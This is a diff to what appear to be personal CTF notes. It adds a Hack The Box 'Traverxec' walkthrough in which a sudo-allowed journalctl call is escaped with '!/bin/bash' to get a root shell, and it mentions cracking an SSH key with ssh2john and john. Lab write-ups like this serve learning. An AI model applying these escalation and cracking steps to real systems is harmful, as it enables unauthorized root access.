@@ -225,6 +225,75 @@ THM{6637f41d0177b6f37cb20d775124699f}
 ```
 ## tryhackme linux privlege escalation arena()80 different SUID binaries(80 different priv esc methods):
 
+## priv esc with journalctl -  hack the box traverxec root:
+
+We find an interesting file in `bin` called `server-stats.sh` so we run it to see what its doing.
+
+```#!/usr/bin/env bash
+
+#!/usr/bin/env bash
+david@traverxec:~/bin$ bash server-stats.sh
+                                                                          .----.
+                                                              .---------. | == |
+   Webserver Statistics and Data                              |.-"""""-.| |----|
+         Collection Script                                    ||       || | == |
+          (c) David, 2019                                     ||       || |----|
+                                                              |'-.....-'| |::::|
+                                                              '"")---(""' |___.|
+                                                             /:::::::::::\"    "
+                                                            /:::=======:::\
+                                                        jgs '"""""""""""""'
+
+Load:  00:38:38 up 1 day,  5:31,  2 users,  load average: 0.00, 0.00, 0.00
+
+Open nhttpd sockets: 3
+Files in the docroot: 117
+
+Last 5 journal log lines:
+-- Logs begin at Thu 2020-04-09 19:07:20 EDT, end at Sat 2020-04-11 00:38:38 EDT. --
+Apr 10 23:47:54 traverxec sudo[4133]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/7 ruser=www-data rhost=  user=www-data
+Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): conversation failed
+Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): auth could not identify password for [www-data]
+Apr 10 23:47:56 traverxec sudo[4133]: www-data : command not allowed ; TTY=pts/7 ; PWD=/tmp ; USER=root ; COMMAND=list
+Apr 10 23:47:56 traverxec crontab[4194]: (www-data) LIST (www-data)
+```
+we can see that it is outputting some kind of logs so we take a look at the file to see exactly what its doing.
+```#!/usr/bin/env bash
+#!/bin/bash
+
+cat /home/david/bin/server-stats.head
+echo "Load: `/usr/bin/uptime`"
+echo " "
+echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
+echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
+echo " "
+echo "Last 5 journal log lines:"
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+```
+We can see on the top line that it is reading the head for `server-stats` which is the ascii art and the copyright.
+
+But at the bottom is the part that is running as root(sudo)
+```#!/usr/bin/env bash
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+```
+This tells us that we can run `journalctl` as root.
+
+We can do a quick search on gtfobins which tells us that we can use it to execute a shell if our window is minimal.
+```#!/usr/bin/env bash
+avid@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+-- Logs begin at Thu 2020-04-09 19:07:20 EDT, end at Sat 2020-04-11 01:14:31 EDT. --
+Apr 10 23:47:54 traverxec sudo[4133]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/7 ruser=www-data rhost=  user=w
+Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): conversation failed
+Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): auth could not identify password for [www-data]
+Apr 10 23:47:56 traverxec sudo[4133]: www-data : command not allowed ; TTY=pts/7 ; PWD=/tmp ; USER=root ; COMMAND=list
+Apr 10 23:47:56 traverxec crontab[4194]: (www-data) LIST (www-data)
+!/bin/bash
+root@traverxec:/home/david#
+```
+After the script has executed we type `!/bin/bash` which will give us a shell.
+
+Overall this wasnt the greatest way to do this as without gtfobins it required pure guesswork as the shell wouldnt work if the window wasnt minmised.
+
 
 ## Other
 
@@ -342,6 +411,7 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
 ```
 From here we have the private ssh key. We transfer this to our box and run ssh2john followed by john to get our password. We then just simply ssh as the user
 and use the password that we cracked.
+
 ```bash
 
 kali@kali:~/tryhackme$ nano id_rs
